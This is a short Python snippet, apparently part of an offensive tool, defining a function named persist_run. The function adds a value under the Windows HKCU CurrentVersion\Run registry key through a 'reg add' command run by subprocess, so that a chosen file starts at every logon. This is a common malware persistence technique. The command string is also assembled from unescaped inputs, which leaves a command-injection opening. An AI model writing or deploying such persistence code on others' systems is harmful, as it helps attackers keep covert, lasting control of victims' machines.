import subprocess

def persist_run(filename, file_path):
    key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    query = f"reg add {key} /v '{filename}' /t REG_SZ /f /d {file_path}"
    subprocess.call(query)